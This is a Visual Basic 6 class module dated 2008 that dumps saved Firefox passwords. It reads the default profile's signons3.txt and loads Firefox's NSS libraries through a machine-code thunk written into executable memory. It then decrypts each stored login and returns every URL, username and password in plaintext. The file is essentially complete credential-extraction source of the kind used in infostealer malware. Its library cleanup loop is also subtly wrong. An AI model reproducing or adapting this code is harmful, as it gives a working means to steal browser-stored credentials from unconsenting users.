VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "cFFPD"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
'---------------------------------------------------------------------------------------
' Module      : cFFPD
' DateTime    : 17/12/2008 12:36
' Author      : Cobein
' Mail        : cobein27@hotmail.com
' WebPage     : http://www.advancevb.com.ar
' Purpose     : Recover FF pass, tested v3.0.4
' Usage       : At your own risk
' Requirements: None
' Distribution: You can freely use this code in your own
'               applications, but you may not reproduce
'               or publish this code on any web site,
'               online service, or distribute as source
'               on any media without express permission.
'
' Credits     : Ported from delphi source I guess is from aphex and using cCDECL from Paul Caton
'
' History     : 17/12/2008 First Cut....................................................
'               17/12/2008 Fix..........................................................
'---------------------------------------------------------------------------------------
Option Explicit
Option Base 0

Private Const CSIDL_PROGRAM_FILES   As Long = &H26
Private Const CSIDL_APPDATA         As Long = &H1A

Private Type SHITEMID
    cb              As Long
    abID            As Byte
End Type

Private Type TSECItem
    SECItemType     As Long
    SECItemData     As Long
    SECItemLen      As Long
End Type

'API declarations
Private Declare Function SHGetPathFromIDList Lib "shell32.dll" Alias "SHGetPathFromIDListA" (ByVal pidl As Long, ByVal pszPath As String) As Long
Private Declare Function SHGetSpecialFolderLocation Lib "shell32.dll" (ByVal hwndOwner As Long, ByVal nFolder As Long, pidl As SHITEMID) As Long
Private Declare Function lstrlen Lib "kernel32" Alias "lstrlenA" (ByVal lpString As String) As Long
Private Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
Private Declare Function FreeLibrary Lib "kernel32" (ByVal hLibModule As Long) As Long
Private Declare Function GetLastError Lib "kernel32" () As Long
Private Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long
Private Declare Function LoadLibraryA Lib "kernel32" (ByVal lpLibFileName As String) As Long
Private Declare Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
Private Declare Function VirtualFree Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal dwFreeType As Long) As Long
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal ByteLen As Long)
Private Declare Sub GetMem4 Lib "msvbvm60" (ByVal Addr As Long, RetVal As Long)
Private Declare Sub PutMem1 Lib "msvbvm60" (ByVal Addr As Long, ByVal NewVal As Byte)
Private Declare Sub PutMem2 Lib "msvbvm60" (ByVal Addr As Long, ByVal NewVal As Integer)
Private Declare Sub PutMem4 Lib "msvbvm60" (ByVal Addr As Long, ByVal NewVal As Long)
Private Declare Sub PutMem8 Lib "msvbvm60" (ByVal Addr As Long, ByVal NewVal As Currency)

'Private constants
Private Const ERR_SRC       As String = "cCDECL"    'Error source name
Private Const ERR_NUM       As Long = vbObjectError 'cCDECL error number base
Private Const MAX_ARG       As Long = 16            'Maximum number of parameters, you can change this if required
Private Const PATCH_01      As Long = 15            'CDECL patch, CDECL function address
Private Const PATCH_02      As Long = 10            'Callback patch, bas mod function address patch
Private Const PATCH_03      As Long = 16            'Callback patch, stack adjustment patch

'Parameter block
Private Type tParamBlock
  ParamCount                As Long                 'Number of parameters to be forwarded to the cdecl function
  Params(0 To MAX_ARG - 1)  As Long                 'Array of parameters to be forwarded to the cdecl function
End Type

'Private variables
Private bNewDLL             As Boolean              'Flag to indicate that the loaded DLL has changed
Private hMod                As Long                 'DLL module handle
Private nAddr               As Long                 'Cache the previous cdecl function's address
Private pCode               As Long                 'Pointer to the CDECL code
Private sLastFunc           As String               'Cache the previous cdecl function's name
Private pb                  As tParamBlock          'Parameter block instance

'Replace the stub proc (z_DO_NOT_CALL) with machine-code to handle the cdecl function
Private Sub Class_Initialize()
    Dim pMe As Long
  
    'Get the address of my vtable into pMe
    GetMem4 ObjPtr(Me), pMe

    'Allocate a page of executable memory
    pCode = VirtualAlloc(0, &H1000&, &H1000&, &H40&)
  
    'Copy the CDECL translation code to memory
    PutMem8 pCode + 0, -208642111809017.9757@
    PutMem8 pCode + 8, -605931634821031.5515@
    PutMem8 pCode + 16, 20765931315670.1386@
    PutMem8 pCode + 24, -857143604525899.4687@
    PutMem4 pCode + 32, &HC2C03102
    PutMem2 pCode + 36, &HC

    'Patch the first vtable entry (z_DO_NOT_CALL) to point to the CDECL code
    PutMem4 pMe + &H1C, pCode
  
    'Copy the callback thunk code to memory
    PutMem8 pCode + 40, 479615108421936.7656@
    PutMem8 pCode + 48, -140483859888551.3191@
    PutMem8 pCode + 56, 99649511.6971@
    PutMem8 pCode + 64, 21442817159.0144@
End Sub

Private Sub Class_Terminate()
    'Free virtual memory
    Call FreeLibrary(hMod)
    VirtualFree pCode, 0, &H8000&
End Sub

'This sub is replaced by machine code at pCode at class instance creation...
'IT MUST ONLY be called internally by CallFunc.
Public Function z_DO_NOT_CALL(ByVal nAddrParamBlock As Long) As Long
End Function

Public Function Enumerate() As String
    Dim sPath       As String
    Dim sFFPath     As String
    Dim lKeySlot     As Long
    Dim lvLibs(6)   As Long
    Dim sRet        As String
   
    Dim tSec        As TSECItem
    Dim tSecDec     As TSECItem
    Dim bvRet()     As Byte
    
    Dim sPass       As String
    Dim svEntry()   As String
    Dim svLines()   As String
    Dim i           As Long
    Dim j           As Long
    
    On Error Resume Next
    
    sPath = GetSpecialfolder(CSIDL_PROGRAM_FILES) & "\Mozilla Firefox\"

    lvLibs(0) = LoadLibraryA(sPath & "mozcrt19.dll")
    lvLibs(1) = LoadLibraryA(sPath & "sqlite3.dll")
    lvLibs(2) = LoadLibraryA(sPath & "nspr4.dll")
    lvLibs(3) = LoadLibraryA(sPath & "plc4.dll")
    lvLibs(4) = LoadLibraryA(sPath & "plds4.dll")
    lvLibs(5) = LoadLibraryA(sPath & "nssutil3.dll")
    lvLibs(6) = LoadLibraryA(sPath & "softokn3.dll")
    Call DllLoad(sPath & "nss3.dll")

    sFFPath = GetSpecialfolder(CSIDL_APPDATA) & "\Mozilla\Firefox\" & "profiles.ini"
       
    sRet = Space(260)
    Call GetPrivateProfileString("Profile0", "Path", vbNullString, sRet, 260, sFFPath)
    sRet = Left$(sRet, lstrlen(sRet))

    sFFPath = GetSpecialfolder(CSIDL_APPDATA) & "\Mozilla\Firefox\" & sRet & "\signons3.txt"
    
    Open sFFPath For Binary Access Read As #1
    sPass = Space(LOF(1))
    Get #1, , sPass
    Close #1

    sRet = GetSpecialfolder(CSIDL_APPDATA) & "\Mozilla\Firefox\" & sRet

    svEntry = Split(sPass, "." & vbCrLf)
     
    bvRet = StrConv(sRet, vbFromUnicode)
    
    If CallFunc("NSS_Init", StrPtr(bvRet)) = 0 Then
        lKeySlot = CallFunc("PK11_GetInternalKeySlot")
        If Not lKeySlot = 0 Then
            If CallFunc("PK11_Authenticate", lKeySlot, True, 0) = 0 Then
                For i = 1 To UBound(svEntry) - 1
                    svLines = Split(svEntry(i), vbCrLf)
                    Enumerate = Enumerate & " " & "URL: " & svLines(0) & vbCrLf
                    For j = 1 To UBound(svLines) - 3 Step 2
                        If Not svLines(j + 1) = "---" Then
                            Enumerate = Enumerate & " " & "Section: " & svLines(j) & vbCrLf
                            Enumerate = Enumerate & " " & "Value: " & svLines(j + 1) & vbCrLf

                            bvRet = StrConv(svLines(j + 1), vbFromUnicode)
                            Call CallFunc("NSSBase64_DecodeBuffer", 0, VarPtr(tSec), StrPtr(bvRet), Len(svLines(j + 1)))

                            If CallFunc("PK11SDR_Decrypt", VarPtr(tSec), VarPtr(tSecDec), 0) = 0 Then
                                If tSecDec.SECItemLen > 0 Then
                                    ReDim bvRet(tSecDec.SECItemLen - 1)
                                    CopyMemory bvRet(0), ByVal tSecDec.SECItemData, tSecDec.SECItemLen
                                    Enumerate = Enumerate & " " & "Data: " & StrConv(bvRet, vbUnicode) & vbCrLf
                                End If
                            End If
                        End If
                    Next
                    Enumerate = Enumerate & " " & String(64, ".") & vbCrLf
                Next
            End If
            Call CallFunc("PK11_FreeSlot", lKeySlot)
        End If
        Call CallFunc("NSS_Shutdown")
    End If
    For i = 0 To 6
        Call FreeLibrary(lvLibs(0))
    Next
End Function

Private Function GetSpecialfolder(ByVal lFolder As Long) As String
    Dim tSHITEMID As SHITEMID

    If SHGetSpecialFolderLocation(0, lFolder, tSHITEMID) = 0 Then
        GetSpecialfolder = Space$(512)
        Call SHGetPathFromIDList(ByVal tSHITEMID.cb, ByVal GetSpecialfolder)
        GetSpecialfolder = Left$(GetSpecialfolder, lstrlen(GetSpecialfolder))
    End If
End Function


'Purpose:
' Call the named cdecl function with the passed parameters
'
'Arguments:
' sFunction - Name of the cdecl function to call
' ParmLongs - ParamArray of parameters to pass to the named cdecl function
'
'Return:
'  The return value of the named cdecl function
Public Function CallFunc(ByVal sFunction As String, ParamArray ParmLongs() As Variant) As Long
    Dim i As Long
    Dim j As Long
  
    'Check that the DLL is loaded
    If hMod = 0 Then
    
        'If in the IDE just stop, programmer may have On Error Resume Next protection and miss the problem.
        Debug.Assert False
        Call Err.Raise(ERR_NUM + 0, ERR_SRC, "DLL not loaded")
    End If

    'Check to see if we're calling the same cdecl function as the previous call to CallFunc
    If (StrComp(sLastFunc, sFunction) <> 0) Or bNewDLL Then
    
        'Get the address of the function
        nAddr = GetProcAddress(hMod, sFunction)
        If nAddr = 0 Then
      
            'If in the IDE just stop, programmer may have On Error Resume Next protection and miss the problem.
            Debug.Assert False
            Call Err.Raise(ERR_NUM + 1, ERR_SRC, "Failed to locate function: " & sFunction)
        End If

        'Patch the code buffer to call the relative address to the cdecl function
        PutMem4 pCode + PATCH_01, nAddr - pCode - (PATCH_01 + 4)
        bNewDLL = False
        sLastFunc = sFunction
    End If
  
    With pb
        j = UBound(ParmLongs)
        If j >= MAX_ARG Then
      
            'If in the IDE just stop, programmer may have On Error Resume Next protection and miss the problem.
            Debug.Assert False
            Call Err.Raise(ERR_NUM + 2, ERR_SRC, "Too many parameters")
        End If
    
        'Fill the parameter block
        For i = 0 To j
            .Params(i) = ParmLongs(i)
        Next i
    
        .ParamCount = i                                         '(j + 1)
    End With
  
    CallFunc = z_DO_NOT_CALL(VarPtr(pb))                      'Execute the code buffer passing the address of the parameter block

End Function

'Load the DLL
Public Function DllLoad(ByVal sName As String) As Boolean
    hMod = LoadLibraryA(sName)

    If hMod <> 0 Then
        DllLoad = True
        'It's remotely possible that the programmer could change the dll and then call a function
        'in the new dll with exactly the same name as the previous CallFunc to the previous DLL. This would
        'defeat the caching scheme and result in the old function in the old dll being called. An unlikely
        'scenario, but stranger things have happened. Soooo, explicitly indicate that we're using a new dll
        bNewDLL = True
    End If
  
    'If in the IDE just stop on failure, programmer may not be checking the return value.
    Debug.Assert DllLoad
End Function
